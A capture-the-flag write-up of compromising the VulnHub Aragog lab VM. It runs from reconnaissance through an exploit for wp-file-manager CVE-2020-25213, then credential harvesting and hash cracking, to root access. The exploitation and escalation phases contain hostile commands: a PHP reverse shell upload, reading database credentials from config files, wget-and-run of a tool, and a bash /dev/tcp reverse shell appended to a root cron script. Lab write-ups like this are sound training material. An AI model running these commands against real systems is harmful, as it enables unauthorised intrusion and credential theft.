# Penetration Testing Write-Up
## VulnHub HarryPotter: Aragog (1.0.2)
**Alejandro Garcia | February 26, 2026**

---

## Phase 1: Reconnaissance

Ran `ip a` to find the Kali VM's IP address on the host-only network.

`ip a`

Ran an nmap scan of the network to get all the devices on my host-only network.

`nmap -sn 192.168.56.0/24`

Ran a targeted scan to check if this is Aragog's VM IP. Got both port 80 and 22 open which tells me this is the Aragog VM.

`nmap 192.168.56.102`

Then I ran a more in-depth nmap scan to see what services are running, their versions, OS, and common vulns.

`nmap -sV -sC -A -p- 192.168.56.102`

<img width="801" height="459" alt="InDepthNMAPScan" src="https://github.com/user-attachments/assets/00f4e4ef-a03c-4a38-9d64-15fae6cfdd9a" />


Found that port 22 runs SSH and port 80 is a web server we should definitely look at.

---

## Phase 2: Web Enumeration

Visited http://192.168.56.102 and got the Harry Potter picture for their site.

<img width="1087" height="649" alt="HPSite" src="https://github.com/user-attachments/assets/870b65e1-8e68-4502-9f2f-186730b85826" />


I am now going to do a directory brute-force to find any hidden directories using gobuster.

`gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt`

<img width="832" height="678" alt="dirbuster" src="https://github.com/user-attachments/assets/6d9ec212-bb00-4e47-aac5-e4bd307508bc" />


Found /blog. When visited, it reveals a WordPress site.

---

## Phase 3: WordPress Vulnerability Scanning

Now I will scan the WordPress site using WPScan to find any vulns.

`wpscan --url http://192.168.56.102/blog/ --enumerate ap --plugins-detection aggressive`

<img width="1690" height="1264" alt="wpscan" src="https://github.com/user-attachments/assets/5433cc32-4422-466c-8afd-582551119313" />


Found an out-of-date wp-file-manager plugin that is vulnerable to unauthenticated arbitrary file upload (CVE-2020-25213). I can upload a PHP reverse shell directly to the server.

---

## Phase 4: Exploitation

Cloned the GitHub repository for the exploit.

`git clone https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213`

Need to change the IP and port in the payload file to point back to my Kali machine.

<img width="672" height="258" alt="SettinhUpExploit" src="https://github.com/user-attachments/assets/20821e18-401a-4a79-b396-8dff772a3df2" />

Started listener, as the reverse shell will connect back to me.

`nc -lvnp 1234`

<img width="511" height="71" alt="StartListener" src="https://github.com/user-attachments/assets/7cb4e99b-c705-4ba3-9337-3f5bd3ba2892" />

Ran the exploit and then triggered the shell.

`bash wp-file-manager-exploit.sh -u http://192.168.56.102/blog -f payload.php`

`curl http://192.168.56.102/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php`

<img width="1053" height="838" alt="RunningExploitAct" src="https://github.com/user-attachments/assets/a612c342-55c3-4abb-8956-a435061b4b32" />


Got a reverse shell as www-data.

---

## Phase 5: Post-Exploitation — Credential Harvesting

Now I need to upgrade the shell to get an interactive bash shell, then look for the database credentials.

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Found WordPress database credentials by locating wp-config.php with find, which led to /usr/share/wordpress/wp-config.php, then followed its reference to the actual credentials in /etc/wordpress/config-default.php (Debian stores WordPress configs separately from the web root).

`find / -name "wp-config.php" 2>/dev/null`

`cat /etc/wordpress/config-default.php`

<img width="685" height="227" alt="FindingDBPAssword" src="https://github.com/user-attachments/assets/576537f0-4b5b-4261-af6e-b39ff6d78f77" />

Credentials found:
- User: root
- Password: mySecr3tPass

Got into the database using the password.

`mysql -u root -pmySecr3tPass`

<img width="787" height="222" alt="GotintoDatabase" src="https://github.com/user-attachments/assets/9b36faed-cfa1-48e8-92b4-608e4f3069fd" />

Found hagrid98's password hash in the wp_users table.

<img width="816" height="265" alt="FoundHash" src="https://github.com/user-attachments/assets/b92ba9b1-3d5d-4a00-8e62-7440217c463b" />

---

## Phase 6: Hash Cracking & Lateral Movement

Used John the Ripper to crack the hash.

`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

<img width="728" height="224" alt="UnhashPass" src="https://github.com/user-attachments/assets/0e967247-5644-41ea-b512-0fffc60d2397" />

Cracked password: password123

Now I will SSH in as hagrid98.

`ssh hagrid98@192.168.56.102`

Got the first Horcrux.

<img width="731" height="418" alt="FirstHorcrox" src="https://github.com/user-attachments/assets/edf1f1b0-b892-4620-8d0a-a6a5f4c15f90" />

---

## Phase 7: Privilege Escalation to Root

I need to gain root access for the second Horcrux.

Downloaded pspy and served it to the target machine to monitor processes.

`python3 -m http.server 8000`

<img width="896" height="559" alt="pspysetup" src="https://github.com/user-attachments/assets/4c800c6f-49cc-4656-ae7a-585960ba19a3" />


`wget http://192.168.56.101:8000/pspy64 && chmod +x pspy64 && ./pspy64`

<img width="861" height="583" alt="pspyrunning" src="https://github.com/user-attachments/assets/f74b1698-02e3-49c9-adb8-4a93631f2bbd" />

Ran it to see cron jobs running as root. Found that /opt/.backup.sh is executed by root periodically.

<img width="823" height="135" alt="rootun" src="https://github.com/user-attachments/assets/6fd2313a-25fc-4dcb-8762-fd1cfd03c674" />

Injected a reverse shell into the backup script and opened a listener waiting for the cron job to execute.

`echo 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1' >> /opt/.backup.sh`

`nc -lvnp 5555`

<img width="1027" height="725" alt="reverseshellandlistener" src="https://github.com/user-attachments/assets/1eb3dfcb-4c8d-4b38-8fda-ef15d84f9b1c" />

Gained root and found the 2nd Horcrux.

<img width="760" height="681" alt="2ndhorcrux" src="https://github.com/user-attachments/assets/17913e74-36ec-4704-b2ce-5e2494a84b62" />

---

## Summary

The Aragog VM was compromised through a chain of vulnerabilities starting with an outdated WordPress plugin (wp-file-manager CVE-2020-25213) that allowed unauthenticated file upload. From there, database credentials were extracted, a user password was cracked, and privilege escalation was achieved by injecting a reverse shell into a root-owned cron job script. Both Horcruxes were successfully recovered.
